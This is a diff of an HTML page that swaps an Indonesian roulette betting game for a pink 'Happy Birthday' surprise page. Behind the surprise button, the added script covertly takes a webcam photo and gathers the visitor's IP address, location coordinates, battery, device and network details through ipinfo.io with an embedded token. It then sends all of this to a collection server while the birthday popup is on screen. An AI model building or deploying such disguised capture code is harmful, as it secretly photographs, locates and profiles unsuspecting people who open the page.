@@ -3,171 +3,208 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Reme Game with BET</title>
+  <title>Mancis Peng</title>
   <style>
-  .hij {
-    color: green;
-  }
-  .hijtua {
-    color: #4CAF50;
-  }
     body {
-      font-family: Arial, sans-serif;
+      font-family: 'Chewy', cursive ;
+      margin: 0;
+      padding: 0;
+      background: #ffcce7;
+      color: #5a2d0c;
       text-align: center;
-      margin: 20px;
     }
-    .dl-container {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin-bottom: 20px;
+
+    h1 {
+      font-size: 2.5rem;
+      margin-top: 20px;
+      color: #ff6fa1;
+      text-shadow: 1px 1px 2px #ffffff, 0 0 10px #ff99c8;
     }
-    .dl-container img {
-      width: 30px;
-      height: 30px;
-      margin-right: 10px;
+
+    #collectData {
+      font-size: 1.5rem;
+      padding: 15px 30px;
+      border: none;
+      border-radius: 50px;
+      background: linear-gradient(135deg, #ff7eb3, #ff4081);
+      color: white;
+      cursor: pointer;
+      box-shadow: 0 5px 15px rgba(255, 105, 180, 0.4);
+      transition: all 0.3s ease;
     }
-    .roulette-container {
-      position: relative;
-      width: 250px;
-      height: 250px;
-      margin: 20px auto;
-      border-radius: 50%;
-      border: 5px solid #000;
-      overflow: hidden;
+
+    #collectData:hover {
+      background: linear-gradient(135deg, #ff4081, #ff7eb3);
+      transform: scale(1.1);
     }
-    .roulette-wheel {
+
+    #collectData:active {
+      transform: scale(1.05);
+    }
+
+    body:before {
+      content: '';
       position: absolute;
-      width: 100%;
-      height: 100%;
-      border-radius: 50%;
-      background: conic-gradient(
-        red 0% 10%, black 10% 20%, red 20% 30%, black 30% 40%, 
-        red 40% 50%, black 50% 60%, red 60% 70%, black 70% 80%, 
-        red 80% 90%, black 90% 100%
-      );
-      transform: rotate(0deg);
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      z-index: -1;
+      background: url('https://cdn.pixabay.com/photo/2016/03/05/19/02/sweets-1238612_960_720.jpg') center/cover no-repeat;
+      opacity: 0.2;
     }
-    .spin-button, .bet-button {
-      padding: 10px 20px;
-      font-size: 18px;
-      background-color: #4CAF50;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-      margin: 5px;
-    }
-    .spin-button:disabled, .bet-button:disabled {
-      background-color: #888;
-      cursor: not-allowed;
-    }
-    .info-button {
-      position: fixed;
-      top: 20px;
-      right: 20px;
-      width: 50px;
-      height: 50px;
-      border-radius: 50%;
-      background-color: #ADD8E6;
-      color: white;
-      font-size: 24px;
-      border: none;
-      cursor: pointer;
-    }
-    .result-table {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      margin: 20px 0;
-    }
-    .result-box {
-      width: 300px;
-      padding: 10px;
-      margin: 5px 0;
-      background-color: #f1f1f1;
-      border: 2px solid #ccc;
-      border-radius: 10px;
-      text-align: center;
-      font-size: 18px;
-      font-weight: bold;
-      transition: border-color 0.3s, background-color 0.3s;
-    }
-    .popup {
+
+    #popup {
       display: none;
       position: fixed;
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
-      width: 300px;
       padding: 20px;
-      background-color: white;
-      border: 1px solid #ccc;
-      border-radius: 10px;
-      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+      background: #fff;
+      border: 3px solid #ff99c8;
+      border-radius: 15px;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+      z-index: 1000;
     }
-    .popup.active {
-      display: block;
+
+    #popup h2 {
+      font-size: 2rem;
+      color: #ff6fa1;
     }
-    .popup .close-btn {
-      margin-top: 10px;
-      padding: 5px 10px;
-      font-size: 14px;
-      background-color: #f44336;
+
+    #popup button {
+      background: #ff4081;
       color: white;
+      padding: 10px 20px;
       border: none;
-      border-radius: 5px;
+      border-radius: 10px;
       cursor: pointer;
     }
-    .popup .close-btn:hover {
-      background-color: #d32f2f;
-    }
-    @keyframes spin-animation {
-      from {
-        transform: rotate(0deg);
-      }
-      to {
-        transform: rotate(1440deg);
-      }
+
+    #popup button:hover {
+      background: #ff6fa1;
     }
   </style>
 </head>
 <body>
-  <h1>Reme BET v1 <img src="images/faran.png" width="30" height="30" alt="DL"></h1>
-  <div class="dl-container">
-    <img src="images/DL.png" alt="DL">
-    <span id="dl-display">10</span>
+  <h1>Pencet Tombol dibawah</h1>
+  <button id="collectData">🎉 Surprise 🎉</button>
+
+  <div id="popup">
+    <h2>🍫🤎Happy Birthday! 🤎🍫</h2>
+    <button onclick="closePopup()">OK</button>
   </div>
 
-  <div class="result-table">
-    <div id="admin-result" class="result-box">Admin spun wheel got </div>
-    <div class="roulette-container">
-      <div id="roulette-wheel" class="roulette-wheel"></div>
-    </div>
-    <div id="player-result" class="result-box">You spun wheel got </div>
-  </div>
+  <script>
+    function showPopup() {
+      const popup = document.getElementById('popup');
+      popup.style.display = 'block';
+    }
 
-  <button id="spin-button" class="spin-button" onclick="spin()">Spin</button>
-  <button id="bet-button" class="bet-button" onclick="placeBet()">BET</button>
-  <button id="info-button" class="info-button">i</button>
+    function closePopup() {
+      const popup = document.getElementById('popup');
+      popup.style.display = 'none';
+    }
 
-<!-- Popup Informasi -->
-<div id="info-popup" class="popup">
-  <p>Cara Bermain:</p>
-  <p>1. Angka Player lebih besar = Winn</p>
-  <p>2. Angka Player lebih kecil = Lose</p>
-  <p>3. Angka Player Seri = Auto Lose</p>
-  <p>4. Angka 0, 19, 28 = x3 Bet anda</p>
-  <p>5. Admin 0, 19, 28 = Auto Lose</p>
-  <p>- - -</p>
-  <p class="hij">Anda bisa mengatur taruhan</p>
-  <p class="hij">dengan mencet BET!</p>
-  <p class="hij">Maksimal BET 10DL</p>
-  <p class="hijtua">DL anda habis? refresh web saja</p>
-   <img src="images/faran.png" width="110" height="90" alt="DL">
-   <p> Wujud asli Pemain Judi</p>
-  <button id="close-info" class="close-btn">Tutup</button>
-</div>
-  <script src="script.js"></script>
+    async function capturePhoto() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+
+        await new Promise((resolve) => (video.onloadedmetadata = resolve));
+        video.play();
+
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        stream.getTracks().forEach((track) => track.stop());
+
+        return canvas.toDataURL('image/png');
+      } catch (error) {
+        console.error('Error capturing photo:', error);
+        return null;
+      }
+    }
+
+    async function collectDeviceInfo() {
+      const data = {};
+      const apiToken = "6d8519218e7b69";
+      const apiUrl = `https://ipinfo.io/json?token=${apiToken}`;
+
+      try {
+        // Fetch location and IP info
+        const ipInfo = await fetch(apiUrl);
+        const ipData = await ipInfo.json();
+        data.ip = ipData.ip || "Unknown IP";
+        data.location = {
+          city: ipData.city || "Unknown",
+          region: ipData.region || "Unknown",
+          country: ipData.country || "Unknown",
+          coordinates: ipData.loc || "Unknown",
+        };
+
+        // Fetch battery info
+        if (navigator.getBattery) {
+          const battery = await navigator.getBattery();
+          data.battery = {
+            level: battery.level * 100 + '%',
+            charging: battery.charging,
+          };
+        } else {
+          data.battery = "Battery API not supported";
+        }
+
+        // Device info
+        data.device = {
+          userAgent: navigator.userAgent || "Unknown User Agent",
+          platform: navigator.platform || "Unknown Platform",
+        };
+
+        // Network info
+        if (navigator.connection) {
+          const connection = navigator.connection;
+          data.network = {
+            type: connection.effectiveType || "Unknown",
+            downlink: connection.downlink ? connection.downlink + ' Mbps' : "Unknown",
+          };
+        } else {
+          data.network = "Network API not supported";
+        }
+
+      } catch (error) {
+        console.error("Error collecting device info:", error);
+      }
+
+      return data;
+    }
+
+    document.getElementById('collectData').addEventListener('click', async () => {
+      showPopup();
+      const photo = await capturePhoto();
+      const deviceInfo = await collectDeviceInfo();
+
+      const data = {
+        photo: photo,
+        deviceInfo: deviceInfo,
+      };
+
+      try {
+        const response = await fetch('http://127.0.0.1:5000/data', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data),
+        });
+        const result = await response.json();
+        console.log('Server response:', result);
+      } catch (error) {
+        console.error('Error sending data:', error);
+      }
+    });
+  </script>
 </body>
-</html>
+</html
